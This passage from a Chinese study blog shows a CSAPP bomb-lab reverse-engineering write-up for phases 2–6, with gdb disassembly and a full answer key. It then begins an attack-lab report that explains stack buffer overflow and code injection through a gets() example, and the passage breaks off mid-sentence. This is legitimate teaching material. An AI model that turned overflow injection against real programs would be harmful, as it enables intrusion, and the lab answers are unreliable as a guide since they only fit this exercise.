% d"，符合这个函数的命名。因此第一步，口令需要按这个格式以六个整数开头。</p>
<p>回到 <code>phase_2</code>，发现还有两个导致炸弹引爆的因素：</p>
<ul>
<li>+18：第一个元素值不为 1</li>
<li>+34：两个值不相等</li>
</ul>
<p>阅读 + 52 到 + 62，再到 + 34 可知，第二个约束时要求数组的下一个元素需要是这一个的两倍大，进而可以得到正确的口令。</p>
<h2 id="phase-3">phase 3</h2>
<p>与 Phase
2 类似，也是考察 <code>sscanf</code>。反汇编 <code>phase_3</code> 得到：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_3:</span><br><span class="line">   0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">   0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx</span><br><span class="line">   0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi</span><br><span class="line">   0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000400f5b &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;  // 读入两个整数，存储于rdx(rsp+8), rcx(rsp+12)</span><br><span class="line">   0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax</span><br><span class="line">   0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;</span><br><span class="line">   0x0000000000400f65 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp) </span><br><span class="line">   0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt; // 第一个数如果&gt;7, 则爆炸</span><br><span class="line">   0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax</span><br><span class="line">   0x0000000000400f75 &lt;+50&gt;:    jmpq   *0x402470(,%rax,8) // 第一个数用于计算跳转偏移，基础位置是 0x400f7c</span><br><span class="line">   0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax</span><br><span class="line">   0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax</span><br><span class="line">   0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax</span><br><span class="line">   0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax</span><br><span class="line">   0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax</span><br><span class="line">   0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax</span><br><span class="line">   0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax</span><br><span class="line">   0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fad &lt;+106&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax</span><br><span class="line">   0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax</span><br><span class="line">   0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax</span><br><span class="line">   0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt; // 第二个数与eax不同，则爆炸</span><br><span class="line">   0x0000000000400fc4 &lt;+129&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp</span><br><span class="line">   0x0000000000400fcd &lt;+138&gt;:   retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
<p>可以发现，只需要根据第一个数确定 eax 取值，也就是第二个数，就可以通过这个 phase。根据 <code>jmpq</code> 猜测源码中有 <code>switch</code>，<code>jmpq</code> 下面的部分就是跳转表。</p>
<h2 id="phase-4">phase 4</h2>
<p>首先反汇编 <code>phase4</code>：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">=&gt; 0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx // num2 </span><br><span class="line">   0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx // num1 </span><br><span class="line">   0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi // "%d %d"</span><br><span class="line">   0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000401024 &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax</span><br><span class="line">   0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt; // 读不到两个数，爆炸</span><br><span class="line">   0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)</span><br><span class="line">   0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt; // num1&lt;=0xe, 避免爆炸</span><br><span class="line">   0x0000000000401035 &lt;+41&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx</span><br><span class="line">   0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi</span><br><span class="line">   0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi</span><br><span class="line">   0x0000000000401048 &lt;+60&gt;:    callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x000000000040104d &lt;+65&gt;:    test   %eax,%eax</span><br><span class="line">   0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt; // 若func4结果不为0, 爆炸</span><br><span class="line">   0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp) </span><br><span class="line">   0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt; // num2==0, 避免爆炸</span><br><span class="line">   0x0000000000401058 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp</span><br><span class="line">   0x0000000000401061 &lt;+85&gt;:    retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
<p>调用 <code>func4</code> 之前的代码很好理解，依然是读数 + 校验。<code>func4</code> 接收三个参数，分别是 num1、0、0xe，返回值若不为 0 则会爆炸。<code>func4</code> 反汇编如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax // </span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax // eax=para3-para2</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx // ecx=para3-para2</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx // ecx&gt;&gt;=31 &lt;=&gt; ecx=sign(ecx) = 0 or 1</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax // eax+=ecx</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:    sar    %eax // eax 算数右移 1 位</span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx // ecx=rax+rsi</span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt; // ecx&lt;=edi=num1</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx // edx=rcx-1</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:    callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt; // ecx&gt;=edi</span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:    callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x000000000040100b &lt;+61&gt;:    retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
<p>可以看出，<code>func4</code> 会递归调用本身。首先要思考，func4 在什么情况下不会调用自己，可以发现：</p>
<ul>
<li>+22-&gt;+36：ecx&lt;=edi=num1</li>
<li>+43-&gt;+57：ecx&gt;=edi</li>
</ul>
<p>两个均成立时，ecx=edi，返回值 eax=0，那么只需要根据 ecx 确定 num1 即可。</p>
<h2 id="phase-5">phase 5</h2>
<p>首先反汇编：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">   0x0000000000401062 &lt;+0&gt;:     push   %rbx</span><br><span class="line">   0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp</span><br><span class="line">   0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx</span><br><span class="line">   0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax</span><br><span class="line">   0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)</span><br><span class="line">   0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax</span><br><span class="line">   0x000000000040107a &lt;+24&gt;:    callq  0x40131b &lt;string_length&gt;</span><br><span class="line">   0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax</span><br><span class="line">   0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt; // 字符串长度不为0，则爆炸</span><br><span class="line">   0x0000000000401084 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx // ecx=input[i]</span><br><span class="line">   0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)</span><br><span class="line">   0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx // rdx=input[i]</span><br><span class="line">   0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx // edx %=16</span><br><span class="line">   0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx // maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</span><br><span class="line">   0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1) // input[i]=s[edx]</span><br><span class="line">   0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax // rax+=1</span><br><span class="line">   0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax</span><br><span class="line">   0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt; // !=6循环</span><br><span class="line">   0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)</span><br><span class="line">   0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi // 秘钥 flyers</span><br><span class="line">   0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi // 修改后的输入</span><br><span class="line">   0x00000000004010bd &lt;+91&gt;:    callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax</span><br><span class="line">   0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt; // eax!=0，爆炸</span><br><span class="line">   0x00000000004010c6 &lt;+100&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)</span><br><span class="line">   0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax // 循环变量 eax=0</span><br><span class="line">   0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax</span><br><span class="line">   0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax</span><br><span class="line">   0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;</span><br><span class="line">   0x00000000004010e9 &lt;+135&gt;:   callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp</span><br><span class="line">   0x00000000004010f2 &lt;+144&gt;:   pop    %rbx</span><br><span class="line">   0x00000000004010f3 &lt;+145&gt;:   retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
<p>可以看出，输入的口令需要是一个长度为 6 的字符串，在循环内部对字符串每一位进行了修改，具体是取 ascii%16 的值，作为另一个字符串的下标索引，映射得到新字符串。反过来，就可以得到原始口令。%16 的结果应该为 9,15,14,5,6,7，对应到 ASCII 即可。</p>
<h2 id="phase-6">phase 6</h2>
<p>老规矩，先反汇编：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">   0x00000000004010f4 &lt;+0&gt;:     push   %r14</span><br><span class="line">   0x00000000004010f6 &lt;+2&gt;:     push   %r13</span><br><span class="line">   0x00000000004010f8 &lt;+4&gt;:     push   %r12</span><br><span class="line">   0x00000000004010fa &lt;+6&gt;:     push   %rbp</span><br><span class="line">   0x00000000004010fb &lt;+7&gt;:     push   %rbx</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi // int[6]</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:    callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14</span><br><span class="line">   0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d // 循环变量i</span><br><span class="line">   0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp // </span><br><span class="line">   0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax </span><br><span class="line">   0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax // eax=a[i]-1</span><br><span class="line">   0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax</span><br><span class="line">   0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt; // 1&lt;=a[i]&lt;=6, 避免爆炸, jbe是无符号比较</span><br><span class="line">   0x0000000000401123 &lt;+47&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d // i+=1</span><br><span class="line">   0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d</span><br><span class="line">   0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt; // 循环结束</span><br><span class="line">   0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx // 内层循环，j=i</span><br><span class="line">   0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax</span><br><span class="line">   0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax </span><br><span class="line">   0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)</span><br><span class="line">   0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt; // a[j]!=a[i], j&gt;i, 否则爆炸</span><br><span class="line">   0x0000000000401140 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt; //</span><br><span class="line">   0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx // j=j+1</span><br><span class="line">   0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx</span><br><span class="line">   0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt; // j&lt;=5, 跳转至65</span><br><span class="line">   0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13 // a[i] 地址自增4</span><br><span class="line">   0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;</span><br><span class="line">   0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi // 循环结束，新循环开始，数组边界</span><br><span class="line">   0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax</span><br><span class="line">   0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx</span><br><span class="line">   0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx</span><br><span class="line">   0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx  </span><br><span class="line">   0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax) // a[i]=7-a[i]</span><br><span class="line">   0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax // i+=1</span><br><span class="line">   0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax</span><br><span class="line">   0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt; // i&lt;6</span><br><span class="line">   0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi // 循环变量</span><br><span class="line">   0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">   0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx</span><br><span class="line">   0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax</span><br><span class="line">   0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax</span><br><span class="line">   0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt; // 重复a[i]次</span><br><span class="line">   0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">   0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">   0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2) // (void*)[6] B B[i]=0x6032d0</span><br><span class="line">   0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi // i+=1</span><br><span class="line">   0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi</span><br><span class="line">   0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt; // 循环结束</span><br><span class="line">   0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx // 循环开始, ecx=a[i]</span><br><span class="line">   0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx</span><br><span class="line">   0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt; // a[i]&lt;=1</span><br><span class="line">   0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax</span><br><span class="line">   0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">   0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx // 循环结束, B[0]</span><br><span class="line">   0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax // &amp;B[1]</span><br><span class="line">   0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi // 循环边界</span><br><span class="line">   0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx // B[i]</span><br><span class="line">   0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx // B[i+1]</span><br><span class="line">   0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx) // *(B[i]+8)=B[i+1] &lt;=&gt; B[i].next=B[i+1]</span><br><span class="line">   0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax // i+=1</span><br><span class="line">   0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax</span><br><span class="line">   0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt; // 循环结束</span><br><span class="line">   0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx // </span><br><span class="line">   0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</span><br><span class="line">   0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx) // 循环结束</span><br><span class="line">   0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp // 循环变量 i=5</span><br><span class="line">   0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax // </span><br><span class="line">   0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax</span><br><span class="line">   0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)</span><br><span class="line">   0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt; *(B[0])&gt;=*(*B[0]+8) &lt;=&gt; B[i].val&gt;=B[i].next.val</span><br><span class="line">   0x00000000004011e9 &lt;+245&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx // rbx=*(*rbx+8)</span><br><span class="line">   0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp</span><br><span class="line">   0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt; // i!=1</span><br><span class="line">   0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp</span><br><span class="line">   0x00000000004011fb &lt;+263&gt;:   pop    %rbx</span><br><span class="line">   0x00000000004011fc &lt;+264&gt;:   pop    %rbp</span><br><span class="line">   0x00000000004011fd &lt;+265&gt;:   pop    %r12</span><br><span class="line">   0x00000000004011ff &lt;+267&gt;:   pop    %r13</span><br><span class="line">   0x0000000000401201 &lt;+269&gt;:   pop    %r14</span><br><span class="line">   0x0000000000401203 &lt;+271&gt;:   retq</span><br></pre></td></tr></tbody></table></figure>
<p>前面的部分很好理解，要求输入数组 <code>int
a[6]</code> 内部不能有重复元素，且 <code>a[i] &lt;=
6</code>，然后再做变换 <code>a[i]=7-a[i]</code>。</p>
<p>从 + 123 开始的循环，可以看出是要根据 <code>a[i]</code> 初始化一个位于 <code>0x20</code> 的 void
* 数组
B，此时还不知道 B 的每个元素指向的是什么。当 <code>a[i]&gt;1</code> 时，+130 处的循环涉及多次寻址，比较复杂，而且难以理解，
可以通过观察打表看 B 的取值。</p>
<p>首先输入 "6 5 4 3 2 1"，转换为 "1 2 3 4 5 6"，然后打印 B 的值依次为：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) print *(int **) ($sp+0x20)</span><br><span class="line">$16 = (int *) 0x6032d0 &lt;node1&gt;</span><br><span class="line">(gdb) print *(int **) ($sp+0x28)</span><br><span class="line">$17 = (int *) 0x6032e0 &lt;node2&gt;</span><br><span class="line">(gdb) print *(int **) ($sp+0x30)</span><br><span class="line">$18 = (int *) 0x6032f0 &lt;node3&gt;</span><br><span class="line">(gdb) print *(int **) ($sp+0x38)</span><br><span class="line">$19 = (int *) 0x603300 &lt;node4&gt;</span><br><span class="line">(gdb) print *(int **) ($sp+0x40)</span><br><span class="line">$20 = (int *) 0x603310 &lt;node5&gt;</span><br><span class="line">(gdb) print *(int **) ($sp+0x48)</span><br><span class="line">$21 = (int *) 0x603320 &lt;node6&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>可以看出，随着 <code>a[i]+=1</code>，<code>b[i]+=0x10</code>。而且联想到 + 130 处的循环，<code>0x8(%rdx),%rdx</code>，可以猜测到 <code>*B[i]</code> 应该是一个结构体（大小超过了 8
Bytes），且内部含有指针（可以自更新），进而可以猜测 0x6032d0 这个地址就是链表头部。猜到这一点，后面理解起来就很容易了。</p>
<p>链表节点指向的值依次为</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) print **(int **) ($sp+0x20)</span><br><span class="line">$23 = 332</span><br><span class="line">(gdb) print **(int **) ($sp+0x28)</span><br><span class="line">$24 = 168</span><br><span class="line">(gdb) print **(int **) ($sp+0x30)</span><br><span class="line">$25 = 924</span><br><span class="line">(gdb) print **(int **) ($sp+0x38)</span><br><span class="line">$26 = 691</span><br><span class="line">(gdb) print **(int **) ($sp+0x40)</span><br><span class="line">$27 = 477</span><br><span class="line">(gdb) print **(int **) ($sp+0x48)</span><br><span class="line">$28 = 443</span><br></pre></td></tr></tbody></table></figure>
<p>注意，上面的 int 替换为 long，结果相同，说明有可能结构体里存储的是 int 并发生了对齐填充。</p>
<p>在 + 204 处的循环里，对链表进行了重排，使得 <code>B[i].next=B[i+1]</code>。+243 处判断重排后的链表需要满足 <code>B[i].val&gt;=B[i].next.val</code>，否则会爆炸。只需根据上面的节点值，调整输入的值顺序，使得重排后的链表降序排列即可。</p>
<h2 id="答案">答案</h2>
<p>分别是每个 phase 的答案，供参考，部分答案不唯一。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">0 207</span><br><span class="line">7 0</span><br><span class="line">)/.%&amp;'</span><br><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
        <tag>实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab-3 实验报告: attacklab</title>
    <url>/blog/2023/12/04/CSAPP-Lab-3/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本文介绍了笔者在做 attacklab 一节的实验报告。该 lab 要求通过 gdb 等工具，以缓冲区溢出的方式攻击二进制执行文件。
<span id="more"></span>
这段时间一直在忙秋招和毕业，很多事情都搁置了，希望毕业顺利。</p>
<h2 id="理论知识">理论知识</h2>
<p>熟悉 C 语言的同学都知道，库函数 <code>char *gets (char
*str)</code> 用于一行字符串的读取，传入缓冲区地址。该函数不会进行边界检查，如果长度超出缓冲区大小，就会污染其他内存，可能造成段错误。别有用心的黑客甚至可以利用这个漏洞，执行自定义的逻辑。一般来说有两种方式。</p>
<h3 id="代码注入">代码注入</h3>
<p>如果没有栈随机化、栈执行检查等检查措施，代码注入是一种很简单的攻击手段。它的思想是，在读入的字符串中，注入汇编代码，并通过 <code>ret</code> 的跳转机制，使得代码得到执行。假设有如下的代码：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P</span><span class="params">()</span></span>{</span><br><span class="line">	Q();</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Q</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>执行逻辑为：</p>
<ol type="1">
<li>P 中通过 <code>call</code> 指令调用 Q，等价于先 <code>push</code> 下一条指令地址到栈上，再跳转到 <code>Q</code></li>
<li>Q 中申请 64 字节的栈空间，完成字符串读入和处理</li>
<li> Q 通过 <code>ret</code> 指令返回 <code>P</code>，等价于 <code>pop
%rip</code>，即将栈上的地址弹出写入 PC 寄存器</li>
</ol>
<p>栈空间如下图所示：</p>
<p><img src="code_injection.png"></p>
<p>栈是向下增长的，从上到下依次是：</p>
<ol type="1">
<li>P 的栈空间（最底部为返回地址 A）</li>
<li>Q 的栈空间（B 为缓冲区起始地址）</li>
</ol>
<p>这种情况下，黑客可以在缓冲区中注入恶意代码（exploit
